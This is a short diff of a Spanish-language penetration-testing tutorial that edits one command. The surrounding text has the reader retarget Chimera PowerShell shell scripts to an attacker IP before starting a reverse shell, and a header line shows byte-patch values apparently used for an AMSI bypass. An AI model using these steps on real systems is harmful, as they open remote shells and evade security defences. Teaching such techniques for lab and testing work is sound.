@@ -186,7 +186,8 @@ $Patch = [Byte[]] (0xc3, 0x90, 0x90)
 Una vez instalado [Chimera](https://github.com/tokyoneon/Chimera) debemos adecuar el script para que se comunique con nuestra máquina atacante:
 
  ```bash
-/opt/chimera$ sed -i 's/192.168.56.101/10.0.2.5/g' shells/*.ps1
+cd /opt/chimera
+sed -i 's/192.168.56.101/10.0.2.5/g' shells/*.ps1
  ```
  
 Y posteriormente levantar nuestra Reverse Shell:
